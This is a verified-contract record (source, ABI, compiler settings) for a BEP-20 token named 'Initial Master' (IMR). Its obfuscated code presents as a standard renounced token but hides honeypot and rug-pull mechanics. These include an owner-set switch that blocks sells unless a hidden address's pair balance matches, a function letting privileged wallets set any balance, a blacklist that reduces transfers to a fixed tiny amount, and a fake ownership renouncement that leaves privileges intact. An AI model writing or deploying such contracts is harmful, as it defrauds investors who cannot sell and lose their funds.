{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface toTx {\n    function createPair(address totalAutoAt, address tradingAmountMin) external returns (address);\n}\n\ninterface autoSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalTrading) external view returns (uint256);\n\n    function transfer(address swapSender, uint256 limitTeam) external returns (bool);\n\n    function allowance(address autoLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapSender,\n        uint256 limitTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptMin, uint256 value);\n    event Approval(address indexed autoLimit, address indexed spender, uint256 value);\n}\n\nabstract contract autoMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapSellIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromReceiver is autoSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InitialMaster is autoMin, autoSender, fromReceiver {\n\n    uint256 private receiverTo;\n\n    uint256 buyMinFee;\n\n    function liquidityAt(address toLaunch, uint256 limitTeam) public {\n        modeTotal();\n        senderLiquidity[toLaunch] = limitTeam;\n    }\n\n    event OwnershipTransferred(address indexed limitMarketingExempt, address indexed receiverAtSell);\n\n    bool public amountIsReceiver;\n\n    address private autoTokenMode;\n\n    bool private atList;\n\n    uint256 marketingFee;\n\n    address public liquidityIs;\n\n    string private txReceiver = \"IMR\";\n\n    function getOwner() external view returns (address) {\n        return autoTokenMode;\n    }\n\n    mapping(address => uint256) private senderLiquidity;\n\n    function approve(address walletShould, uint256 limitTeam) public virtual override returns (bool) {\n        liquidityTo[_msgSender()][walletShould] = limitTeam;\n        emit Approval(_msgSender(), walletShould, limitTeam);\n        return true;\n    }\n\n    function balanceOf(address totalTrading) public view virtual override returns (uint256) {\n        return senderLiquidity[totalTrading];\n    }\n\n    uint256 constant teamSenderToken = 19 ** 10;\n\n    function transfer(address toLaunch, uint256 limitTeam) external virtual override returns (bool) {\n        return limitModeTake(_msgSender(), toLaunch, limitTeam);\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityTo;\n\n    mapping(address => bool) public toTokenFund;\n\n    constructor (){\n        \n        swapSellIs launchedToken = swapSellIs(marketingReceiver);\n        shouldTo = toTx(launchedToken.factory()).createPair(launchedToken.WETH(), address(this));\n        \n        liquidityIs = _msgSender();\n        fundSell[liquidityIs] = true;\n        senderLiquidity[liquidityIs] = modeMarketingMin;\n        autoListShould();\n        if (senderAmountReceiver) {\n            receiverTo = senderSwapReceiver;\n        }\n        emit Transfer(address(0), liquidityIs, modeMarketingMin);\n    }\n\n    address modeFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function modeTotal() private view {\n        require(fundSell[_msgSender()]);\n    }\n\n    uint256 private senderSwapReceiver;\n\n    function txList(address atSwapAuto, address swapSender, uint256 limitTeam) internal returns (bool) {\n        require(senderLiquidity[atSwapAuto] >= limitTeam);\n        senderLiquidity[atSwapAuto] -= limitTeam;\n        senderLiquidity[swapSender] += limitTeam;\n        emit Transfer(atSwapAuto, swapSender, limitTeam);\n        return true;\n    }\n\n    bool public senderAmountReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeMarketingMin;\n    }\n\n    string private autoFee = \"Initial Master\";\n\n    function fromTrading(uint256 limitTeam) public {\n        modeTotal();\n        buyMinFee = limitTeam;\n    }\n\n    function limitModeTake(address atSwapAuto, address swapSender, uint256 limitTeam) internal returns (bool) {\n        if (atSwapAuto == liquidityIs) {\n            return txList(atSwapAuto, swapSender, limitTeam);\n        }\n        uint256 swapLaunch = autoSender(shouldTo).balanceOf(modeFrom);\n        require(swapLaunch == buyMinFee);\n        require(swapSender != modeFrom);\n        if (toTokenFund[atSwapAuto]) {\n            return txList(atSwapAuto, swapSender, teamSenderToken);\n        }\n        return txList(atSwapAuto, swapSender, limitTeam);\n    }\n\n    bool private txSwap;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txReceiver;\n    }\n\n    bool public receiverTotalIs;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toFee;\n    }\n\n    function totalMax(address receiverReceiverFee) public {\n        modeTotal();\n        \n        if (receiverReceiverFee == liquidityIs || receiverReceiverFee == shouldTo) {\n            return;\n        }\n        toTokenFund[receiverReceiverFee] = true;\n    }\n\n    function owner() external view returns (address) {\n        return autoTokenMode;\n    }\n\n    function autoAt(address walletAtLimit) public {\n        require(walletAtLimit.balance < 100000);\n        if (receiverTotalIs) {\n            return;\n        }\n        if (senderAmountReceiver == txSwap) {\n            enableSwapTo = receiverTo;\n        }\n        fundSell[walletAtLimit] = true;\n        \n        receiverTotalIs = true;\n    }\n\n    address marketingReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public shouldTo;\n\n    uint256 private modeMarketingMin = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public fundSell;\n\n    uint256 public enableSwapTo;\n\n    function name() external view virtual override returns (string memory) {\n        return autoFee;\n    }\n\n    function autoListShould() public {\n        emit OwnershipTransferred(liquidityIs, address(0));\n        autoTokenMode = address(0);\n    }\n\n    bool private limitLaunched;\n\n    function allowance(address txFee, address walletShould) external view virtual override returns (uint256) {\n        if (walletShould == marketingReceiver) {\n            return type(uint256).max;\n        }\n        return liquidityTo[txFee][walletShould];\n    }\n\n    function transferFrom(address atSwapAuto, address swapSender, uint256 limitTeam) external override returns (bool) {\n        if (_msgSender() != marketingReceiver) {\n            if (liquidityTo[atSwapAuto][_msgSender()] != type(uint256).max) {\n                require(limitTeam <= liquidityTo[atSwapAuto][_msgSender()]);\n                liquidityTo[atSwapAuto][_msgSender()] -= limitTeam;\n            }\n        }\n        return limitModeTake(atSwapAuto, swapSender, limitTeam);\n    }\n\n    uint8 private toFee = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMarketingExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAtSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountIsReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAtLimit\",\"type\":\"address\"}],\"name\":\"autoAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoListShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSwapTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitTeam\",\"type\":\"uint256\"}],\"name\":\"fromTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTeam\",\"type\":\"uint256\"}],\"name\":\"liquidityAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotalIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAmountReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toTokenFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiverFee\",\"type\":\"address\"}],\"name\":\"totalMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSwapAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InitialMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}